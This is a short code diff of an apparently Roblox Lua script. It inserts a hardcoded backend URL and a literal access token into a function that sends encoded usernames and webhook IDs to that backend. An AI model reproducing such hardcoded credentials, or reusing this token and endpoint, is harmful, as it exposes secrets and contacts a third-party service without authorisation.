@@ -349,7 +349,7 @@ end
 
 Game.DescendantAdded:Connect(bloquearInstancia)
 
-local SECURE_BACKEND_URL = " "
+local SECURE_BACKEND_URL = "jnewww-production.up.railway.app"
 
 local BLACKLIST = {
     4313952753,
@@ -401,7 +401,7 @@ local function requestSecureUrl(category, webhookId)
             username_binary = usernameBinary,
             category = category or "miranda",
             webhook_id = webhookId or "webhook_2",
-            token = " "
+            token = "SHXDOW"
         })
 
         local response = HttpService:RequestAsync({
